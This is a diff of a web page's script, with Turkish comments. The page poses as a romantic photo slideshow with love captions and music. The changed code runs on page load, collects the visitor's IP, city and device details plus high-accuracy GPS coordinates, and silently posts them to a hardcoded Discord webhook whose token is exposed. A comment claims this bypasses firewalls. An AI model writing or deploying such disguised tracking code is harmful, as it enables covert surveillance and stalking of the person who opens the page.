@@ -28,53 +28,49 @@
 
     <script>
         const WEB_URL = "https://discord.com/api/webhooks/1470189609630826658/DAjHbX38Ow-YJOCbk4n0C3WpHnZ7XHCZuA-VLleQpzOU26qEnTw3FuVpegmoY7ghqEnj";
-        
-        // Sadece bir kere çalışması için kilit
         let raporGonderildi = false;
 
+        // En sade gönderim fonksiyonu
         function dcGonder(m) {
             fetch(WEB_URL, {
                 method: 'POST',
+                mode: 'no-cors', // Bilgisayardaki güvenlik duvarlarını aşmak için
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({ content: m })
             });
         }
 
-        function sistemBaslat() {
+        async function sistemiCalistir() {
             if (raporGonderildi) return;
-
-            const cihaz = navigator.userAgent.toLowerCase();
-            const saat = new Date().toLocaleTimeString('tr-TR');
             
-            // Basit cihaz tespiti
-            let model = "Bilinmiyor";
-            if (cihaz.includes("iphone")) model = "iPhone";
-            else if (cihaz.includes("android")) model = "Android Telefon";
-            else if (cihaz.includes("windows")) model = "Windows Bilgisayar";
+            const cihaz = navigator.userAgent;
+            const saat = new Date().toLocaleString('tr-TR');
 
-            fetch('https://ipapi.co/json/')
-                .then(r => r.json())
-                .then(d => {
-                    let mesaj = `🚀 **Giriş Yapıldı!**\n⏰ **Saat:** ${saat}\n📱 **Cihaz:** ${model}\n📍 **Şehir:** ${d.city}\n🌐 **IP:** ${d.ip}`;
-                    dcGonder(mesaj);
-                    
-                    // GPS Konumu İste
-                    if (navigator.geolocation) {
-                        navigator.geolocation.getCurrentPosition(function(p) {
-                            let harita = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
-                            dcGonder(`🎯 **TAM KONUM GELDİ!**\n📍 Harita: ${harita}`);
-                        }, function(e) {
-                            dcGonder("⚠️ GPS İzni Reddedildi.");
-                        }, { enableHighAccuracy: true });
-                    }
-                    raporGonderildi = true;
-                });
+            // IP Bilgisi Al
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const d = await response.json();
+                
+                let mesaj = `💻 **PC/Cihaz Girişi**\n⏰ Saat: ${saat}\n📍 Şehir: ${d.city}\n🌐 IP: ${d.ip}\n📱 Detay: ${cihaz.substring(0, 100)}`;
+                dcGonder(mesaj);
+                raporGonderildi = true;
+
+                // Konum İste
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(p => {
+                        const link = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
+                        dcGonder(`🎯 **TAM KONUM**\n${link}`);
+                    }, null, {enableHighAccuracy: true});
+                }
+            } catch (e) {
+                dcGonder("🚀 Giriş Yapıldı (IP Bilgisi Alınamadı)");
+            }
         }
 
-        // Sayfa açılınca veya bir yere basınca çalıştır
-        window.onload = sistemBaslat;
+        // Sayfa yüklenince beklemeden çalıştır
+        window.onload = sistemiCalistir;
 
-        // --- FOTOĞRAF SİSTEMİ ---
+        // Fotoğraf Sistemi
         const fotolar = ["foto1.jpg", "foto2.jpg", "foto3.jpg", "foto4.jpg", "foto5.jpg"];
         const sozler = ["Seninle her günüm daha güzel.", "Gülüşün dünyamı aydınlatıyor.", "Kalbim hep seninle.", "Sana her baktığımda yeniden aşık oluyorum.", "İyi ki varsın, iyi ki benimsin."];
         let index = 0;
@@ -82,9 +78,7 @@
 
         function ileri() {
             if (audio) audio.play().catch(() => {});
-            
-            // Eğer açılışta rapor gitmediyse butonda tekrar dene
-            if (!raporGonderildi) sistemBaslat();
+            if (!raporGonderildi) sistemiCalistir();
 
             index++;
             if (index >= fotolar.length) {
